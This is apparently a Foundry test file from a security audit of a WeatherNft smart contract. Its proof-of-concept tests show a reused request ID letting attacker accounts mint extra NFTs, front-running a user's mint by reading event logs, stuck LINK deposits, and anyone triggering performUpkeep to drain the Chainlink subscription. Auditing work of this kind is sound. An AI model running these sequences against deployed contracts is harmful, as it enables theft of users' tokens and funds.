// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test, console} from "forge-std/Test.sol";
import {WeatherNft, WeatherNftStore} from "src/WeatherNft.sol";
import {LinkTokenInterface} from "@chainlink/contracts/src/v0.8/shared/interfaces/LinkTokenInterface.sol";
import {Vm} from "forge-std/Vm.sol";
// My imports
import {Deploy} from "src/Deploy.sol";

contract AuditTest is Test {
    WeatherNft weatherNft;
    LinkTokenInterface linkToken;
    address functionsRouter;
    address user = makeAddr("user");
    // My states
    Deploy deploy;

    function setUp() external {
        // My own addresses
        deploy = new Deploy();
        address linkTokenAddr = deploy.linkTokenAddr();
        address upKeeperAddr = deploy.upKeeperAddr();
        address weatherNftAddr = deploy.weatherNftAddr();
        address routerAddr = deploy.routerAddr();
        // You can replace the weather nft contract with your own deployed contract
        weatherNft = WeatherNft(weatherNftAddr);
        linkToken = LinkTokenInterface(linkTokenAddr);
        functionsRouter = routerAddr;
        vm.deal(user, 1000e18);
        deal(address(linkToken), user, 1000e18);

        // fund weather nft sub
        vm.prank(user);
        linkToken.transferAndCall(functionsRouter, 100e18, abi.encode(15459));
    }

    function testBase() public {
        string memory pincode = "125001";
        string memory isoCode = "IN";
        bool registerKeeper = true;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;
        uint256 tokenId = weatherNft.s_tokenCounter();

        vm.startPrank(user);

        linkToken.approve(address(weatherNft), initLinkDeposit);

        bytes32 reqId = weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
            pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
        );
        vm.stopPrank();

        vm.prank(functionsRouter);
        bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        vm.prank(user);
        weatherNft.fulfillMintRequest(reqId);
    }

    function testOnfulfillMintRequestFailDepositedLinkStucks() public {
        string memory pincode = "0000";
        string memory isoCode = "XX";
        bool registerKeeper = true;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;
        uint256 tokenId = weatherNft.s_tokenCounter();

        vm.startPrank(user);

        linkToken.approve(address(weatherNft), initLinkDeposit);

        bytes32 reqId = weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
            pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
        );
        vm.stopPrank();

        vm.prank(functionsRouter);
        bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        vm.prank(user);
        vm.expectRevert(WeatherNftStore.WeatherNft__Unauthorized.selector);
        // forcing a revert
        weatherNft.fulfillMintRequest(bytes32("6666"));

        assertEq(linkToken.balanceOf(address(weatherNft)), 5e18);
    }

    function testRequestIdCanBeReusedForNewNftMints() public {
        string memory pincode = "125001";
        string memory isoCode = "IN";
        bool registerKeeper = true;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;
        // create attakers accounts
        address attackerA = makeAddr("attackerA");
        address attackerB = makeAddr("attackerB");
        address attackerC = makeAddr("attackerC");

        vm.startPrank(user);

        linkToken.approve(address(weatherNft), initLinkDeposit);

        bytes32 reqId = weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
            pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
        );
        vm.stopPrank();

        vm.prank(functionsRouter);
        bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        // The valid WeatherNft minitng
        uint256 tokenIdUser = weatherNft.s_tokenCounter();
        vm.prank(user);
        weatherNft.fulfillMintRequest(reqId);

        // The invalid ones using the same requestId
        uint256 tokenIdAttackerA = weatherNft.s_tokenCounter();
        vm.prank(attackerA);
        weatherNft.fulfillMintRequest(reqId);

        uint256 tokenIdAttackerB = weatherNft.s_tokenCounter();
        vm.prank(attackerB);
        weatherNft.fulfillMintRequest(reqId);

        uint256 tokenIdAttackerC = weatherNft.s_tokenCounter();
        vm.prank(attackerC);
        weatherNft.fulfillMintRequest(reqId);

        assertEq(user, weatherNft.ownerOf(tokenIdUser));
        assertEq(attackerA, weatherNft.ownerOf(tokenIdAttackerA));
        assertEq(attackerB, weatherNft.ownerOf(tokenIdAttackerB));
        assertEq(attackerC, weatherNft.ownerOf(tokenIdAttackerC));
    }

    function testfulfillMintRequestCanBeFrontRun() public {
        string memory pincode = "125001";
        string memory isoCode = "IN";
        bool registerKeeper = true;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;

        address attacker = makeAddr("attacker");

        vm.startPrank(user);
        linkToken.approve(address(weatherNft), initLinkDeposit);

        // The attacker is waiting for the right event log
        vm.recordLogs();
        weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
            pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
        );
        vm.stopPrank();

        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 reqId;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics[0] == keccak256("WeatherNFTMintRequestSent(address,string,string,bytes32)")) {
                // Get the reqId
                (,,, reqId) = abi.decode(logs[i].data, (address, string, string, bytes32));
                break;
            }
        }

        vm.prank(functionsRouter);
        bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        // calculates the new tokenId
        uint256 tokenIdAttacker = weatherNft.s_tokenCounter();
        // Minting with the user reqId before he
        vm.prank(attacker);
        weatherNft.fulfillMintRequest(reqId);
        assertEq(attacker, weatherNft.ownerOf(tokenIdAttacker));
    }

    function testCanBeCalledByAnyoneWithAnithing() public {
        string memory pincode = "125001";
        string memory isoCode = "IN";
        // Disable
        bool registerKeeper = false;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;
        address attacker = makeAddr("attacker");
        uint256 functionRouterBalance;

        vm.startPrank(user);

        linkToken.approve(address(weatherNft), initLinkDeposit);

        bytes32 reqId = weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
            pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
        );
        vm.stopPrank();

        vm.prank(functionsRouter);
        bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        uint256 userTokenId = weatherNft.s_tokenCounter();
        vm.prank(user);
        weatherNft.fulfillMintRequest(reqId);

        //// If the decoded `performData` is a valid TokenId: the related token update his wheather data.

        // Retrieve the lastFulfilledAt value
        (, uint256 prevLastFulfilled,,,) = weatherNft.s_weatherNftInfo(userTokenId);
        // advance some in time
        vm.warp(1 hours);

        // get the functionsRouter balance
        functionRouterBalance = linkToken.balanceOf(functionsRouter);
        vm.prank(attacker);
        weatherNft.performUpkeep(abi.encode(userTokenId));

        vm.prank(functionsRouter);
        weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        (, uint256 lastFulfilled,,,) = weatherNft.s_weatherNftInfo(userTokenId);
        // Check for update
        assert(prevLastFulfilled < lastFulfilled);
        // Check if router balance decreased
        assert(functionRouterBalance > linkToken.balanceOf(functionsRouter));

        //// If the decoded `performData` is not a valid TokenId: the WeatherNft contract will send a request to chainlink functions with invalid arguments (pincode, isocode)

        // get the functionsRouter balance
        functionRouterBalance = linkToken.balanceOf(functionsRouter);
        vm.prank(attacker);
        weatherNft.performUpkeep(abi.encode("HELLO FRIENDS"));

        // Check if router balance decreased
        assert(functionRouterBalance > linkToken.balanceOf(functionsRouter));
    }
}
